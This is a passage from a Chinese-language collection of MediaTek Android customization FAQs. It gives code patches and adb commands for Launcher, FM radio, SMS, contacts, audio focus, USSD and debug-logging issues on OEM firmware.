        Log.w(TAG,"Unable to unregister headset receiver",e);
    }
    ///M: Null object reference checking
    if (mStateMachine != null) {
        // Add By MTK Start
        //M: inform Audio Service that BT SCO is disconnected
        if (mStateMachine.isAudioOn()) {
            AudioManager mAudioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            mAudioManager.setBluetoothScoOn(false);
        }
        // Add By MTK End
        mStateMachine.doQuit();
    }
    return true;
} 
```

## [FAQ17994]  切换语言后返回Launcher主菜单，应用名称没有立即切换成正确的语言

```text
1. 修改LauncherModel.java的getAppShortcutInfo方法，将其中的此段代码：
// from the db
if (TextUtils.isEmpty(info.title) && c != null) {
    info.title = Utilities.trim(c.getString(titleIndex));
}
替换为：
// from PMS.
if (lai != null) {
    info.title = lai.getLabel();
}

2. 修改IconCache.java的cacheLocked方法，在末尾添加：
if (info != null) {
    entry.title = info.getLabel();
}
```

## [FAQ11049]  切换语言后，桌面上的快捷方式名称没有切换到当前语言

```text
这个是google默认设计，如果要修改的话，请按照以下步骤操作：
1、请修改LauncherModel.java的loadWorkspace()方法，修改为如下：
......
if (itemType == LauncherSettings.Favorites.ITEM_TYPE_APPLICATION) {
     info = getAppShortcutInfo(manager, intent, user, context, c, cursorIconInfo.iconIndex, titleIndex, allowMissingTarget, useLowResIcon);
} else {
    info = getShortcutInfo(c, context, titleIndex, cursorIconInfo);
    //mtk add begin
    CharSequence title = getShortcutTitle(manager, intent);
    if(title != null ){
        info.title = title;
    }
    //mtk add end

    // App shortcuts that used to be automatically added to Launcher
    // didn't always have the correct intent flags set, so do that
    // here
    if (intent.getAction() != null &&
        intent.getCategories() != null &&
        intent.getAction().equals(Intent.ACTION_MAIN) &&
        intent.getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
    }
}
......

2、请在LauncherModel.java增加如下方法：
private CharSequence getShortcutTitle(PackageManager manager, Intent intent) {
    ComponentName componentName = intent.getComponent();
    if (componentName == null) {
        return null;
    }
    try {
        PackageInfo pi = manager.getPackageInfo( componentName.getPackageName(), 0);
        if (!pi.applicationInfo.enabled) {
            // If we return null here, the corresponding item will be
            // removed from the launcher
            // db and will not appear in the workspace.
            return null;
        }
    } catch (NameNotFoundException e) {
        Log.d(TAG, "getPackInfo failed for package " + componentName.getPackageName());
    }

    ResolveInfo resolveInfo = manager.resolveActivity(intent, 0);
    if (resolveInfo != null) {
        return resolveInfo.activityInfo.loadLabel(manager);
    }
    return null;
}
PS:标注为黄色的代码即为修改的代码
```

## [launcher]  [FAQ13991]  Launcher2的主菜单一直卡在加载状态，如何解决?

```text
1、请修改Launcher.java的onDestroy方法，将如下code：
mModel.stopLoader();
app.setLauncher(null);
修改为：
// It's possible to receive onDestroy after a new Launcher activity has
// been created. In this case, don't interfere with the new Launcher.
if (mModel.isCurrentCallbacks(this)) {
    mModel.stopLoader();
    app.setLauncher(null);
}
2、请在LauncherModel.java中增加如下code：
public boolean isCurrentCallbacks(Callbacks callbacks) {
    return (mCallbacks != null && mCallbacks.get() == callbacks);
}
```

## [launcher]  [debug]  [FAQ14394]  如何动态打开Launcher的debug开关?

```text
Launcher的deug开关有些默认是关闭的，譬如：DEBUG_MOTION。如何动态打开这些关闭的debug开关?
[SOLUTION] 
请执行
adb shell setprop launcher.debug.xxx true
adb shell stop
adb shell start
 
其中launcher.debug.xxx可以设置为下面的任意值：
launcher.debug.all
launcher.debug
launcher.debug.draw
launcher.debug.drag
launcher.debug.edit
launcher.debug.key
launcher.debug.layout
launcher.debug.loader
launcher.debug.motion
launcher.debug.performance
launcher.debug.surfacewidget
launcher.debug.unread
launcher.debug.loaders
launcher.debug.autotestcase

Note：此FAQ只支持KK2及以上版本，而且只对当次开机有效。
```

## [launcher]  [FAQ11060]  桌面上特定的图标不能被移动和删除

```text
桌面上有些预置的快捷方式，要求不能移动和删除，要怎么做?
[SOLUTION] 
1、请在Workspace.java的startDrag方法中判断将要拖动的图标是否是特定的图标（通过package name/activity name判定），如果是的话，就禁止拖动。
2、那么如何获取当前点击图标的package name呢?
请在Workspace.java的startDrag方法中，在View child = cellInfo.cell;代码后面添加：
ItemInfo info = (ItemInfo)cell.getTag();
接下来判断info是否是ShortcutInfo实例，如果是的话，就可以将info强制转换成ShortcutInfo，然后拿到intent，最后通过intent获取package name/activity name。
```

## [launcher]  [FAQ11206]  快速双击home键回到Launcher3的桌面默认页

```text
Launcher3桌面的默认页是首页(即0页)。
如果当前界面是Launcher3桌面的非默认页，点击home键，可以回到桌面的默认页。但是如果当前界面是其它应用，此时快速双击home键却不能回到桌面的默认页。
[SOLUTION] 
请修改 Launcher3 的 launcher.java 的 onNewIntent 方法，将
final boolean alreadyOnHome = mHasFocus && ((intent.getFlags() & Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT) != Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
修改为：
final boolean alreadyOnHome = (intent.getFlags() & Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT) != Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT;
```

## [launcher]  [FAQ11029]  Launcher3如何增加默认的Home Screen数目?

```text
Launcher3默认的Home Screen数目是由预置的桌面应用(default_workspace_NxN.xml)决定的。如果要增加Home Screen数目，需要在default_workspace_NxN.xml中将桌面应用配置在不同screen id上(如何配置桌面应用请参考FAQ04293)。
```

## [launcher]  [FAQ10350]  如何修改主菜单图标的位置?

```text
M0:
InvariantDeviceProfile.java
hotseatAllAppsRank = (int) (numHotseatIcons / 2); //默认是列数除以2取整，可以设置为需要的值
 
L1/L0:
DynamicGrid.java
hotseatAllAppsRank = (int) (numHotseatIcons / 2); //默认是列数除以2取整，可以设置为需要的值
```

## [launcher]  [FAQ10990]  Launcher如何去掉进入应用时的动画效果?

```text
请修改Launcher.java的startActivity方法，如下：
private boolean startActivity(View v, Intent intent, Object tag) {
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    try {
        // Only launch using the new animation if the shortcut has not opted out (this is a
        // private contract between launcher and may be ignored in the future).
        //boolean useLaunchAnimation = (v != null) && //mtk modify
        //            !intent.hasExtra(INTENT_EXTRA_IGNORE_LAUNCH_ANIMATION); //mtk modify
        boolean useLaunchAnimation = false; //mtk add

        LauncherAppsCompat launcherApps = LauncherAppsCompat.getInstance(this);
        UserManagerCompat userManager = UserManagerCompat.getInstance(this);
```

## [launcher]  [FAQ08556]  如何将主菜单图标改成按安装时间排序?

```text
M：
1. 参考AppNameComparator.java新增：AppInstallTimeComparator.java；
2. 在AlphabeticalAppsList.java新增变量：
private AppInstallTimeComparator mAppInstallTimeComparator;
 
3. 修改AlphabeticalAppsList.java 的构造函数：
将
mAppNameComparator = new AppNameComparator(context);
替换成:
mAppInstallTimeComparator= new AppInstallTimeComparator(context);
 
4. 修改AlphabeticalAppsList.java 的 onAppsUpdated() 方法：
将
Collections.sort(mApps, mAppNameComparator.getAppInfoComparator());
替换成:
Collections.sort(mApps, mAppInstallTimeComparator.getAppInstallTimeComparator());
 
5. 修改AlphabeticalAppsList.java 的 onAppsUpdated() 方法：
将
sectionMap = new TreeMap<>(mAppNameComparator.getSectionNameComparator());
替换成:
sectionMap = new TreeMap<>(mAppInstallTimeComparator.getSectionNameComparator());
 
L以前版本：
1. 在 LauncherModel.java 中加入如下方法：
public static final Comparator<AppInfo> getInstallTimeComparator() {
  return new Comparator<AppInfo>() {
            public final int compare(AppInfo a, AppInfo b) {
                return a.firstInstallTime == b.firstInstallTime ? 0 : a.firstInstallTime > b.firstInstallTime ? 1:-1;
            }
        };
 }

 public static class InstallTimeComparator implements Comparator<ResolveInfo> {
  private PackageManager mPackageManager;
  List<ResolveInfo> mapps;
  InstallTimeComparator(PackageManager pm, List<ResolveInfo> apps)
  {
   mPackageManager = pm;
   mapps = apps;
   
  }
 
  public final int compare(ResolveInfo a, ResolveInfo b) {
   String packageNameA = a.activityInfo.applicationInfo.packageName;
   String packageNameB = b.activityInfo.applicationInfo.packageName;
   long firstInstallTimeA = 0, firstInstallTimeB = 0;
   try{
   firstInstallTimeA = mPackageManager.getPackageInfo(packageNameA, 0).firstInstallTime;
   firstInstallTimeB = mPackageManager.getPackageInfo(packageNameB, 0).firstInstallTime;
   }catch(Exception e){
    e.printStackTrace(); 
    return 0;
   }
  return firstInstallTimeA == firstInstallTimeB ? 0 : firstInstallTimeA > firstInstallTimeB ? 1:-1;
  }
 };
 
2. 修改 LauncherModel.java 的 loadAllAppsByBatch() 方法：
将
Collections.sort(apps,new LauncherModel.ShortcutNameComparator(packageManager, mLabelCache));
替换成:
Collections.sort(apps,new InstallTimeComparator(packageManager, apps));
 
3. 修改 AppsCustomizePagedview.java 的 setApps 方法
将
Collections.sort(mApps, LauncherModel.getAppNameComparator());
替换成:
Collections.sort(mApps, LauncherModel.getInstallTimeComparator());
 
4. reorderApps()在某些条件下会被调用，如果要求在那些条件下也要达到按照安装时间排序，请在调用reorderApps方法前增加
Collections.sort(mApps, LauncherModel.getInstallTimeComparator());
例如：新安装应用后仍然要按照安装时间排序，需要在AppsCustomizePagedview.java的addApps方法中增加sort的调用。如下：
```

## [launcher]  [FAQ05709]  在Launcher界面上锁再解锁后，如何回到上锁前的界面?

```text
M0:
请修改packages/apps/Launcher3/src/com/android/launcher3/Launcher.java的mReceiver的onReceive方法，注释掉下面的代码：
if (mAppsView != null && mWidgetsView != null && mPendingAddInfo.container == ItemInfo.NO_ID) {
    showWorkspace(false);
}

L1/L0/KK:
请修改packages/apps/Launcher3/src/com/android/launcher3/Launcher.java的mReceiver的onReceive方法，注释掉下面的代码：
if(mAppsCustomizeTabHost != null && mPendingAddInfo.container == ItemInfo.NO_ID) {
    showWorkspace(false);
}
```

## [FAQ18067]  [工具] iperf 测试wifi direct的传输速度的方法

```text
iperf如何测试wifi direct的传输速度?
1.推送iperf文件到待测试的两个手机
adb remount
adb push iperf /system/bin
adb shell
cd /system/bin/
chmod 777 iperf

2.两手机进行wifi direct连接
首先，对所有已保存的ap进行取消保存的操作。
然后wifi direct连接。

3.获取手机的ip地址
adb shell
ifconfig p2p0

4.在一个手机上启iperf的server
cd /system/bin/
iperf –s

5.在另一个手机上启iperf的client端
cd /system/bin/
iperf –c [另一手机的ip地址]  -i 3 –t 180

这样就可以了。

-i 3表示每3s报告一次传输速度。
-t 180 表示打流量打180s。


[FAQ06827]  如何内置 iperf 到手机中
先到 https://iperf.fr/iperf-download.php 下载 iperf
1. 将iperf放到Codebase的任意一个目录下(该目录必须能够在搜索Android.mk时被搜索到)，比如system/iperf/iperf
2. 在system/iperf目录下添加一个Android.mk文件，内容如下：
LOCAL_PATH:= $(call my-dir)
PRODUCT_COPY_FILES += $(LOCAL_PATH)/iperf:system/iperf/iperf
```

## [FAQ18048]  如何解决SettingsProvider中的值读写不同步的问题

```text
因为SettingsProivder算是一个公共模块，很多属性的值都写到了SettingsProivder中，但在某些情况下时，
如果写入的值，马上就在另外一个APP中去查询，发现查询得到的值还是旧的值。 
 产生这个问题的原因是，android在设计SettingsProvider时，所有的SettingsPovider保存的属性，如果相关
app读取过一次，就会在app端cache起来，下次再来读这个值时，如果发现该属性所在的表的版本（保存在systemProperties中）没有变化，就
会直接从cache中读旧值，如果版本发生了变化，才会去SettingsProvider中去取真正的新值。这样做的目的是
为了减少ipc调用的次数。但是，问题来了，如果透过systemProperties的api获得版本属性比较慢时，就会发现这个版本还是旧的版本，导致
app认为版本没有变化，就直接从app的cache中取值了，这样取得的就是旧值。
[SOLUTION] 
对自己关注的属性，直接从provider中取值，例如希望“airplane_mode_on ”取得的值一定是最新的值，修改方法如下：
请修改 /frameworks/base/core/java/android/provider/Settings.java
中的
public String getStringForUser(ContentResolver cr, String name, final int userHandle) {
    final boolean isSelf = (userHandle == UserHandle.myUserId());
    if (isSelf&&!name.equals("airplane_mode_on")) {//添加airplane_mode_on 不从cache中取，直接从provider中取
```

## [FAQ14169]  [Audio APP] Music、FM等apk在播放或运行时，从recent app list中删除后，如何实现music、FM等apk立即停止?

```text
在ActivityManagerService.java文件中cleanUpRemovedTaskLocked方法中修改，
private void cleanUpRemovedTaskLocked(TaskRecord tr, int flags) {
    ……
    for (int i = 0; i < procs.size(); i++) {
        ProcessRecord pr = procs.get(i);
        if (pr == mHomeProcess) {
            // Don't kill the home process along with tasks from the same package.
            continue;
        }
        Slog.d(TAG, "pr.processName=" + pr.processName+",pr.setSchedGroup="+pr.setSchedGroup);//第一步，先要该行log,得到要修改的apk的name
        if (pr.setSchedGroup == Process.THREAD_GROUP_BG_NONINTERACTIVE || "要删除的apk" == pr.processName) { //第二步，添加红色字体标记的代码
            Slog.d(TAG,"pr.kill");
            pr.kill("remove task", true);
        }
    }
```

## [FAQ09723]  [FM] 在FM station list界面，将当前正在播放的频道标识出来

```text
1.修改FMRadioActivity.java方法：private void enterChannelList() 
在        intent.setClass(FMRadioActivity.this, FMRadioFavorite.class);
之前添加：
Bundle bd= new Bundle();
bd.putInt("current_freq",mCurrentStation);
intent.putExtras(bd);
2.修改FMRadioFavorite.java
添加：    static private int currentstation;
3.修改    public void onCreate(Bundle savedInstanceState) 
在        super.onCreate(savedInstanceState);
之后添加：
Bundle bd = this.getIntent().getExtras();
currentstation = bd.getInt("current_freq");
4.修改        public void bindView(View view, Context context, Cursor cursor) 
在            viewHolder.mStationFreqView.setText(FMRadioUtils.formatStation(stationFreq));
之前添加：
if (currentstation== stationFreq) {
    stationName =stationName +  "  now playing!";
}
```

## [FAQ09169]  [Audio BT]  连接蓝牙耳机后拨号按键音，第一个按键无声

```text
复现步骤：
1.连接蓝牙耳机；
2.进入拨号盘按键；
3.第一次或者前几次按键均无提示音输出。#问题
 
对比机行为：
1.三星Samsung Galaxy Nexus可以复现；
2.三星S3无法复现。

[SOLUTION] 
原因分析：
1.请参考 FAQ08025，是因为特殊蓝牙耳机兼容性问题，可参考该FAQ做修改；
2.三星S3无法复现的原因是S3的数字键盘提示音不是标准的DTMF音，而换成了其它声音较长的音源，因此OK。

解决方法：
1.属于蓝牙耳机问题，可参考FAQ08025改善；
2.蓝牙耳机本身问题，除非更换数字键盘提示音，否则没有其它更有效的解决方案。
```

## [FAQ08906]  [FM] Music播放后恢复FM后台播放

```text
1. 启动FM播放。
2. 播放music，此时FM被停止播放。等music播放一段时间后暂停，FM不会自动恢复播放。
如果要实现Music暂停后恢复FM播放，请参考以下SOLUTION.
 
[SOLUTION] 
1. 改变申请audiofocus的类型。
在MediaPlaybackService.java (alps\packages\apps\music\src\com\android\music)
public void play() 中去申请audio focus->AUDIOFOCUS_GAIN_TRANSIENT。即：
if (AudioManager.AUDIOFOCUS_REQUEST_FAILED == mAudioManager.requestAudioFocus(
mAudioFocusListener, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN)) {
showToast(getString(R.string.audiofocus_request_failed_message));
MusicLogUtils.w(TAG, "<< play: phone call is ongoing, can not play music!");
return;
}

改为：
if (AudioManager.AUDIOFOCUS_REQUEST_FAILED == mAudioManager.requestAudioFocus(mAudioFocusListener, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT)) {
    showToast(getString(R.string.audiofocus_request_failed_message));
    MusicLogUtils.w(TAG, "<< play: phone call is ongoing, can not play music!");
    return;
}

2. 暂停的时候去做audiofocus释放动作。
在public void pause() 的时候去释放audiofocus
在MusicLogUtils.d(TAG, "pause");之后添加如下两句：
// abandon audiofocus
// abandon audio focus
mAudioManager.abandonAudioFocus(mAudioFocusListener);

3. 在FM获取到audiofocus的时候做Resume动作。
在FMRadioService.java (alps\mediatek\packages\apps\fmradio\src\com\mediatek\fmradio)
public void onAudioFocusChange(int focusChange) 中的如下case中，当获取到audiofocus的时候做resume的动作。
case AudioManager.AUDIOFOCUS_GAIN:
    LogUtils.d(TAG, "AudioFocus: received AUDIOFOCUS_GAIN");
    updateAudioFocusAync(AudioManager.AUDIOFOCUS_GAIN);
    //resume FM Player
    resumeFMAudio();
    break;
```

## [FAQ08593]  [FM] 如何内置FM频道

```text
如有5个频道需要内置，即烧完软件后第一次进入FM，还没有进行搜索时，列表就可以始终显示内置频道
[SOLUTION] 
FMRadioService.java
1.private  int defaultChannels[]  = new int[]  {875, 903, 918, 942, 1025};//自定义内置频道
2.initService()中添加insertDefaultStation(defaultChannels);
3.定义insertDefaultStation()函数
private int[]  insertDefaultStation(int[]  channels) {
    LogUtils.d(TAG, "insertDefaultStation.firstValidChannel:" + Arrays.toString(channels));
    int firstValidChannel = mCurrentStation;
    int channelNum = 0;
    if (null != channels) {
        Arrays.sort(channels);
        int size = channels.length;
        // Save searched stations into database by batch
        ArrayList<ContentProviderOperation> ops = new ArrayList<ContentProviderOperation>();
        String defaultStationName = getString(R.string.default_station_name);
        for (int i = 0; i < size; i++) {
            if (FMRadioUtils.isValidStation(channels[i] )) {
                if (0 == channelNum) {
                    firstValidChannel = channels[i] ;
                }
                if (!FMRadioStation.isDefaultStation(mContext, channels[i] )) {
                    ops.add(ContentProviderOperation.newInsert(Station.CONTENT_URI)
                            .withValue(Station.COLUMN_STATION_NAME, defaultStationName)
                            .withValue(Station.COLUMN_STATION_FREQ, channels[i] )
                            .withValue(Station.COLUMN_STATION_TYPE, FMRadioStation.STATION_TYPE_SEARCHED)
                            .build());
                }
                channelNum++;
            }
        }
        // Save search stations to database by batch
        try {
            mContext.getContentResolver().applyBatch(FMRadioStation.AUTHORITY, ops);
        } catch (RemoteException e) {
            LogUtils.d(TAG, "Exception when applyBatch searched stations " + e);
        } catch (OperationApplicationException e) {
            LogUtils.d(TAG, "Exception when applyBatch searched stations " + e);
        }
    }
    LogUtils.d(TAG, "insertDefaultStation.firstValidChannel:" + firstValidChannel + ",channelNum:" + channelNum);
    return (new int[]  { firstValidChannel, channelNum });
}
4.handleMessage()->case FMRadioListener.MSGID_SCAN_FINISHED:中
result = insertSearchedStation(channels);
insertDefaultStation(defaultChannels);//添加此行
5.FMRadioStation.java中添加
public static boolean isDefaultStation(Context context, int iStation) {
    return isStationExist(context, iStation, STATION_TYPE_SEARCHED);
}
```

## [cts]  [FAQ06619]  需要注意的，有可能使android.theme CTS fail的客制化修改

```text
在DCC上搜索 CTS Customize Guideline.docx 这篇文档。
可能导致 android.theme fail 的客制化建议请参考5.5小节。
```

## [FAQ09510]  [debug] 如何打印出Looper中Message处理的log

```text
Telephony中大量的消息处理与传递都是靠handler与Looper来完成，若是有遇到消息处理（例如某一个message处理太久）导致问题，可以在适当位置按照如下方式打开Looper处理message的相关log查看。
Looper中提供了setMessageLogging(Printer printer)接口可以用来打开Looper.loop()中相关log信息。
例如：
先import android.util.LogPrinter;
然后可以在拨打电话时，加入以下代码，打开log：
Looper.myLooper().setMessageLogging(new LogPrinter(Log.DEBUG, LOG_TAG));
在电话挂断后，加入以下代码关闭log：
Looper.myLooper().setMessageLogging(null);
这样就可以打开整个电话流程中，Phone主线程的Looper对于Message的处理情况。
```

## [FAQ13972]  如何将HOME键传给APP，屏蔽系统的home键功能

```text
KK版本APP可以使用
this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_HOMEKEY_DISPATCHED);
 
L版本因为flag的位数已被系统用完，故没有FLAG_HOMEKEY_DISPATCHED
这个feature，
现在只有通过硬编码才能解决这个问题。
修改PhoneWindowManager.java中的
@Override
public long interceptKeyBeforeDispatching(WindowState win, KeyEvent event, int policyFlags) {
......
// timeout.
if (keyCode == KeyEvent.KEYCODE_HOME) {
    //com.example.adc 替换为贵司的apk 包名称即可。
    if(win != null && win.getAttrs() != null&&win.getOwningPackage().equals("com.example.adc")){
        return 0;// return 0就会丢给app处理了。
    }
    如果要仅仅丢给某个APP的某个activity，可以用下面的方法：
    if(win != null && win.getAttrs() != null&&win.getAttrs().getTitle().contain("xxx.xxx.xxx.xxxActivity")){
        return 0;// return 0就会丢给 xxx.xxx.xxx.xxxActivity处理了。
    }
```

## [sms]  [FAQ17998]  发送长短信时，分段发送的编码方式不一致导致接收方出现乱码

```text
目前对于长短信的编码方式是：
每个part的编码方式是独立的，默认用7bit，如果7bit编码不了，则在该part使用16bit，所以会出现各part使用的编码方式不同。比如第一个part用了16bit编码，第个二part用了7bit编码。
以上编码方式在国内以及其他很多国家都是OK的，但某些运营商不支持这种组合编码pdu的情况，所以当短信从SMSC转发到手机时，pdu编码会被统一成7bit，导致接收方解码成乱码。
 
 
[SOLUTION] 
将各个part统一编码方式。
修改 /packages/apps/Mms/src/com/android/mms/transaction/SmsSingleRecipientSender.java
在sendMessage()内，把
if (messageCount > 1) {
    intent.putExtra(SmsReceiverService.EXTRA_MESSAGE_CONCATENATION, true);
}
改成:
if (messageCount > 1) {
    intent.putExtra(SmsReceiverService.EXTRA_MESSAGE_CONCATENATION, true);
    for (int j = 0;j < messageCount;j++) {
        if (GsmAlphabet.countGsmSeptets(messages.get(j), false) == null) {
            codingType = SmsMessage.ENCODING_16BIT;
            break;
        }
    }
}
```

## [People]  [FAQ10514]  [People] 在联系人用户自定义视图中，默认状态所有账号下面需要全部选中

```text
进入联系人列表 显示菜单--》contacts to display --》customize --》如何默认设置谷歌帐号联系人全部选中?
目前默认是只有My Contacts 和 Starred in Android 这两个有默认选中。
[SOLUTION] 
[第1处修改] 
FILE: ContactsDatabaseHelper.java
PATH: alps/packages/providers/contactsProviders/src/com/android/provider/Contacts
FUNC: onCreate()
@Override
public void onCreate(SQLiteDatabase db) {
Log.i(TAG, "Bootstrapping database version: " + DATABASE_VERSION);
... ...
// Groups table
db.execSQL("CREATE TABLE " + Tables.GROUPS + " (" +
... ...
//  [1309行左右] 
// 修改前
//        Groups.GROUP_VISIBLE + " INTEGER NOT NULL DEFAULT 0," +
// 修改后
Groups.GROUP_VISIBLE + " INTEGER NOT NULL DEFAULT 1," +      // Modified
... ...

... ...
db.execSQL("CREATE TABLE IF NOT EXISTS " + Tables.SETTINGS + " (" +
Settings.ACCOUNT_NAME + " STRING NOT NULL," +
Settings.ACCOUNT_TYPE + " STRING NOT NULL," +
Settings.DATA_SET + " STRING," +
// [1346行左右] 
// 修改前 
//        Settings.UNGROUPED_VISIBLE + " INTEGER NOT NULL DEFAULT 0," +
// 修改后
Settings.UNGROUPED_VISIBLE + " INTEGER NOT NULL DEFAULT 1," +     // Modified
Settings.SHOULD_SYNC + " INTEGER NOT NULL DEFAULT 1" +
");");
... ...

[第2处修改] 
FILE: CustomContactListFilterActivity.java
PATH: alps/packages/contacts/src/com/android/contacts/List

// [311行左右] 
// 修改前
//    private static final int DEFAULT_VISIBLE = 0;
// 修改后
private static final int DEFAULT_VISIBLE = 1;   // Modified
```

## [FAQ10619]  [People]  “设置默认号码”的作用

```text
“设置默认值”仅仅会在DATA表中填写一个IS_PRIMARY的栏位，目前仅此联系人被设为favorite时，在DialtactsActivity中的favorite tab上，若是有设置“默认号码”的话会直接拨出而不会选择号码。
需要注意的是：设置后并不意味着在其他一些界面上选择多号码的联系人拨打电话时会不弹出号码选择的对话框，而直接打出电话。
```

## [FAQ10016]  [People] 如何将联系人编辑界面下拉框中字符串全部左对齐显示?

```text
FILE:   LabeledEditorView.java (L640~L648)
PATH: alps/packages/apps/contacts/src/com/android/contacts/Editor/
private View createViewFromResource(int position, View convertView, ViewGroup parent,
int resource) {
TextView textView;
if (convertView == null) {
textView = (TextView) mInflater.inflate(resource, parent, false);
textView.setAllCaps(true);
[ 4.2 JB ] 
//            textView.setGravity(Gravity.RIGHT | Gravity.CENTER_VERTICAL);   // 右对齐显示
textView.setGravity(Gravity.LEFT | Gravity.CENTER_VERTICAL);    // 左对齐显示
[ 4.4 KK ] 
//            textView.setGravity(Gravity.END| Gravity.CENTER_VERTICAL);           // 右对齐显示
textView.setGravity(Gravity.START | Gravity.CENTER_VERTICAL);    // 左对齐显示

textView.setTextAppearance(mContext, android.R.style.TextAppearance_Small);
textView.setTextColor(mTextColor);
textView.setEllipsize(TruncateAt.MIDDLE);
textView.setHorizontalFadingEdgeEnabled(false);
} else {
textView = (TextView) convertView;
}
```

## [FAQ09727]  [People] 开机英语，之后切换中文，新建联系人还显示部分英文

```text
第一次开机或者恢复出厂设置后，选择其他国家语言(非中文)，开机导航完之后再手动切换到中文语言模式下，
新建联系人中部分字符串依然显示英文字符，如下图。

[SOLUTION] 
SIM/USIM卡第一次插入手机时，就会获取当前系统语言，然后决定显示中文还是英文(国内SIM卡只支持中文英文两种语言)，确定之后会将SIM名称/类型等信息写入数据库telephony.db，如果不手动修改这些信息，即使切换系统语言，这张SIM对应的信息也不会改变。
这也就是为什么其他语言切到中文下SIM卡名字还是显示英文的原因，反之您如果开机设置中文，之后切到其他语言下，SIM卡名字也不会由中文改变为英语。
如果您认为有必要，可以去手动在设置->SIM卡管理中重新设置一个SIM卡的名字即可。

SIM卡信息会保存在数据库telephony.db中，可以使用以下命令导出数据库到C盘根目录查看。
```

## [FAQ09491]  [People]  [RTL] 阿拉伯语下电话号码显示错乱

```text
前提: 对联系人模块(contacts.apk)设置了RTL；
现象: 阿拉伯语等右对齐显示语言下，电话号码显示错乱；
示例: 150 9994 3431，会显示为 3431 9994 150

1. TextView的解决方法(仅显示不是编辑框)：
在Number前后加上控制字符 '\u202D' 和 '\u202C'，这样在显示的时候number就不会乱掉。
Example:
fieldView.setText(TextUtils.isEmpty(number) ? number : '\u202D' + number + '\u202C');

2. EditText的解决方法(编辑框中)：
对这个View
设置text的显示方向为从左到右
fieldView.setTextDirection(TEXT_DIRECTION_LTR);
设置view从右边开始显示
fieldView.setGravity(Gravity.RIGHT);
Example:
在设置RTL后，阿拉伯语下联系人编辑框中输入的号码会乱掉，处理方法如下：
TextFieldsEditorView.java
文件路径：alps/packages/apps/contacts/src/com/android/contacts/Editor
setValues() 方法中处理如下
-----------------------------------------------------------------------------------------------------------
if (inputType == InputType.TYPE_CLASS_PHONE) {
    /** M: New Feature xxx @{ */
    /*
     * original code
     * PhoneNumberFormatter.setPhoneNumberFormattingTextWatcher
     * (mContext, fieldView);
     */
    // add by mediatek
    ExtensionManager.getInstance().getContactDetailExtension().setViewKeyListener(
            fieldView, ContactPluginDefault.COMMD_FOR_OP01);
    PhoneNumberFormatter.setPhoneNumberFormattingTextWatcher(mContext, fieldView, null);
    /** @} */
    //  Add for Arabic language [RTL] 
    String locale = Locale.getDefault().getLanguage();
    if(locale.equals("ar")){
          fieldView.setTextDirection(TEXT_DIRECTION_LTR);
          fieldView.setGravity(Gravity.RIGHT);
    }
    // End for Arabic language [RTL] 
}
-----------------------------------------------------------------------------------------------------------       
备注：("ar") 表示是阿拉伯语，需要进入包import java.util.Locale
```

## [FAQ15362]  查询USSD后结果框显示乱码

```text
将alps\vendor\mediatek\proprietary\hardware\ril\mtk-ril\Ril_ss.c里的onUssd方法里的以下code
if (bNewSSServiceClassFeature == 1) {
    /* DCS is set as "UCS2" by AT+CSCS in ril_callbacks.c */
    dcsString = strdup("UCS2");
    p_data[2]  = dcsString;
} else {
    p_data[2]  = (char *) GsmCbsDcsStringp[dcsType] ;
}
改为
if (bNewSSServiceClassFeature == 1) {
    if (dcsType == DCS_8BIT) {
        // GsmCbsDcsE: DCS_8BIT = 1
        p_data[2]  = (char *) GsmCbsDcsStringp[dcsType] ;
        LOGD("onUssd: p_data[2]  (dcsString) = %s", p_data[2] );
    } else {
        /* DCS is set as "UCS2" by AT+CSCS in ril_callbacks.c */
        dcsString = strdup("UCS2");
        p_data[2]  = dcsString;
    }
} else {
    p_data[2]  = (char *) GsmCbsDcsStringp[dcsType] ;
}
```

## [log]  [FAQ17919]  如何在M版本抓取display相关log

```text
在M版本上，有对kernel log做精简优化，默认抓取到mtklog中的display log非常的少，有时候需要抓取更多的display log 帮助分析。

[SOLUTION] 
1. 抓取display register dump
adb shell cat /d/disp/dump

2. 抓取最近时间的display log 
adb shell cat /d/mtkfb
（该方法只能够抓取最近一段时间的display log）

3.将display log打印到mtklog中（推荐）
adb命令方法 （缺点输入命令后才生效，重启失效）
打开： adb shell "echo mobile:on > /d/mtkfb"
关闭： adb shell "echo mobile:off > /d/mtkfb"
修改代码
/kernel-3.18/drivers/misc/mediatek/video/[chip] /videox/debug.c
unsigned int g_mobilelog = 1;
```

## [FAQ17903]  [Audio Profile] 第三方播放器设置的来电铃声，在铃声列表选择框里不能显示

```text
第三方音乐播放器设置来电铃声后，进入设置里面的手机铃声查看，发现丢失光标，或者找不到所设置的铃声。 将铃声放到其他文件夹，这时候手机铃声列表里面（选择more）可以看到。
 
[SOLUTION] 
因为第三方app insert media DB时不会去写IS_DRM这个字段, 从而使RingtoneManager.java getNewCorsor加载不了在KuwoMusic里面设置的ringtone audio, 第三方行为是正常. 要规避此问题，可以如下修改:
修改RingtoneManager.java, 在appendDrmToWhereClause()方法sb.append(MediaStore.Audio.Media.IS_DRM).append("!=1")和if(it != null)中加上一行code, code如下所示：
sb.append(" or ").append(MediaStore.Audio.Media.IS_DRM).append(" is null");
```

## [FAQ16697]  第一开机或者恢复出厂设置后，桌面小部件很长时间才更新到正常的画面

```text
原因：开机后有很多广播在处理（尤其在安装GMS包的情况下），影响了广播 APPWIDGET_ENABLE 和 APPWIDGET_UPDATE（background broadcast）的分发速度。
解决方法：建议在 AppWidgetServiceImpl.java 中的 sendEnableIntentLocked() 和 sendUpdateIntentLocked() 中，给intent添加 FLAG_RECEIVER_FOREGROUND，这样可以加快 APPWIDGET_ENABLE 和 APPWIDGET_UPDATE 的处理速度。
```

## [FAQ17873]  第一次进入设置——蓝牙，点接收的文件，会比较慢

```text
請修改device\mediatek\common\sepolicy\bluetooth.te

在最後面加上下面這段
# Operation: Program binary service
# Purpose : Add permission for program binary service find from ServiceManager.
